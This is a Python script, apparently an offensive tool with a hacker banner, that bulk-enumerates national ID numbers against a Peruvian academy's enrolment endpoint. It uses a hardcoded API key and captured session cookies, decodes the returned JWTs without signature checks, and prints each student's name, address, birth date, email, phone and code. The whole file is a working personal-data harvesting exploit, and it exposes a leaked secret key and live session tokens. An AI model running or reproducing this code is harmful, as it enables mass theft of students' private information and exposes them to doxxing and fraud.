import jwt
from jwt.exceptions import DecodeError
import requests
from requests.structures import CaseInsensitiveDict
import concurrent.futures
from colorama import Fore,init
from pwn import *
import json
init()
###colores
v = Fore.LIGHTGREEN_EX
a = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTWHITE_EX
r = Fore.LIGHTRED_EX
c = Fore.LIGHTCYAN_EX
m = Fore.LIGHTMAGENTA_EX
reset = Fore.RESET

class Vonex:
    def __init__(self) -> None:
        self.url = "https://matricula.vonex.edu.pe/"
        self.session = requests.session()

    def validate_token(self, encoded_jwt):
        try:
            #secret_key = "token_von_3db9158f53ba081a8051d8e8d25b95ad"
            response = jwt.decode(encoded_jwt, options={"verify_signature": False})
            return response
        except DecodeError:
            return "Token no valido"
    
    def consultarDoc(self, dni):
        headers = CaseInsensitiveDict()
        headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        headers["Accept-Encoding"] = "gzip, deflate, br"
        headers["Accept-Language"] = "es-ES,es;q=0.9"
        headers["Cache-Control"] = "max-age=0"
        headers["Connection"] = "keep-alive"
        headers["Cookie"] = "_ga=GA1.1.1519588211.1711130892; _ga_E8XDYLC69N=GS1.1.1711135582.1.1.1711135827.23.0.0; _ga_1KK4JTL3ZD=GS1.1.1711136209.2.1.1711136210.0.0.0; XSRF-TOKEN=eyJpdiI6IjRvbGpvc3BMVHlMZXI1dGlkR2lld0E9PSIsInZhbHVlIjoiMkJwaWFJTkdlV1UxbTI0RGFOSC9CV0l2UUlYWjNjZ1puQmVTQlI2RW1idGJOZFpuTWJReWtxcVh2Y1VnRFlDQ2dPZ04rYVZCc3dRU0dWU2dOMkZaWXF0V1ZtaHRzUzR1eDVjNUxza0M4QW5SZytHR0svbDVnaWFnTSsrYWJGdTAiLCJtYWMiOiI5ZjRlODc2ZmQzOWMzMjAwMWYxYmFiZTJmZjllYzJlNjFlOWU4NzcxNzIzZjc4YTNlMmZmMmY0MDZlODNjMzQ2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjZXVmFpcEs4VXZlVzh0U0oxMGZrZHc9PSIsInZhbHVlIjoickJDSEIwbXRwTzlwMGZhZFhSbVFnK2ZjcHFwYVVpTCs5cnk1R2RuMHVTVmpISG9XWUordUtscElnNmNDZmdkMUc1OVFKZXp0Q3FGNVdnYXlHRSticjZMM3N6SldVVlQ4dzRXbzJuUE9GOVVqazVYV1ZmU0NBNTJaZGV3cGtmaFUiLCJtYWMiOiJjODQwNjQwZjRhNDcwY2ZkMWE2OTAxMTlmMmRkNzNiNzBiZDI5YzdmMGY4NjZmYmE5Mzk3MGNlNzE3M2I2OWIwIiwidGFnIjoiIn0%3D"
        headers["Host"] = "matricula.vonex.edu.pe"
        headers["Sec-Ch-Ua"] = '''"Not A(Brand";v="99", "Opera GX";v="107", "Chromium";v="121"'''
        headers["Sec-Ch-Ua-Mobile"] = "?0"
        headers["Sec-Ch-Ua-Platform"] = '''"Windows"'''
        headers["Sec-Fetch-Dest"] = "document"
        headers["Sec-Fetch-Mode"] = "navigate"
        headers["Sec-Fetch-Site"] = "none"
        headers["Sec-Fetch-User"] = "?1"
        headers["Upgrade-Insecure-Requests"] = "1"
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0"

        env = requests.get(f"https://matricula.vonex.edu.pe/pre/buscar-alumno?tipo_documento=1&persona_dni={dni}&key=token_von_3db9158f53ba081a8051d8e8d25b95ad", headers=headers)
        rptatext = env.text   
        jwtcifrado = rptatext.replace('"', "")
        descifrar = self.validate_token(jwtcifrado)
        if "Registre sus Datos" in descifrar.get("mensaje", ""):
            log.failure(f"{dni} NO ASOCIADO A VONEX :(")
        elif "correo_personal" in descifrar.get("alumno", {}):
            datajson = descifrar
            dni = datajson['alumno']['persona_dni']
            codigo = datajson['alumno']['codigo']
            fecha_nacimiento = datajson['alumno']['fecha_nacimiento']
            correo = datajson['alumno']['correo_personal']
            anio = datajson['alumno']['anio_termino']
            numerocel = datajson['alumno']['persona']['telefono']
            nombres = datajson['alumno']['persona']['nombres']
            apepa = datajson['alumno']['persona']['apellido_paterno']
            apema = datajson['alumno']['persona']['apellido_materno']
            direccio = datajson['alumno']['persona']['direccion']
            log.success(f"{v}USUARIO {dni} REGISTRADO EN VONEX.{reset}")
            log.success(f"\n{v}[{b}DNI{v}] {c}=> {b}{dni}\n{v}[{b}NOMBRES{v}] {c}=> {b}{nombres}\n{v}[{b}APELLIDO PATERNO{v}] {c}=> {b}{apepa}\n{v}[{b}APELLIDO MATERNO{v}] {c}=> {b}{apema}\n{v}[{b}DIRECCIÓN{v}] {c}=> {b}{direccio}\n{v}[{b}CÓDIGO{v}] {c}=> {b}{codigo}\n{v}[{b}FECHA DE NACIMIENTO{v}] {c}=> {b}{fecha_nacimiento}\n{v}[{b}CORREO{v}] {c}=> {b}{correo}\n{v}[{b}AÑO{v}] {c}=> {b}{anio}\n{v}[{b}CELULAR{v}] {c}=> {b}{numerocel}\n\n{reset}")

def banner():
    print(f"""
{a}      ,___          .-;'
{a}       `"-.`\_...._/`.`      {m}____   ____                                                 
{a}    ,      \        /        {m}\   \ /   /___   ____   ____ ___  ___  
{a} .-' ',    / ()   ()\        {m} \   Y   /  _ \ /    \_/ __ |\  \/  /  
{a}`'._   \  /()    .  (|       {m}  \     (  <_> )   |  \  ___/ >    < 
{a}    > .' ;,     -'-  /       {m}   \___/ \____/|___|  /\___  >__/\_ \  
{a}   / <   |;,     __.;        {m}                    \/     \/      \/  
{a}   '-.'-.|  , \    , \       {b}   X_X DEAD
{a}      `>.|;, \_)    \_)      {r}   @ExternalCase
{a}       `-;     ,    /        {v}   ..::2024::..
{a}          \    /   <         
{a}           '. <`'-,_)        
{a}             '._)             
    """)

banner()
def consultar_dni(dni):
    x = Vonex()
    x.consultarDoc(dni)

def leer_archivo_lista_dnis(nombre_archivo):
    with open(nombre_archivo, 'r') as archivo:
        lista_dnis = archivo.readlines()
    lista_dnis = [dni.strip() for dni in lista_dnis]
    return lista_dnis

lista_dnis = leer_archivo_lista_dnis("vonex.txt")
max_hilos = 5
with concurrent.futures.ThreadPoolExecutor(max_workers=max_hilos) as executor:
    resultados = executor.map(consultar_dni, lista_dnis)
    

print("Todas las consultas han finalizado.")
input()

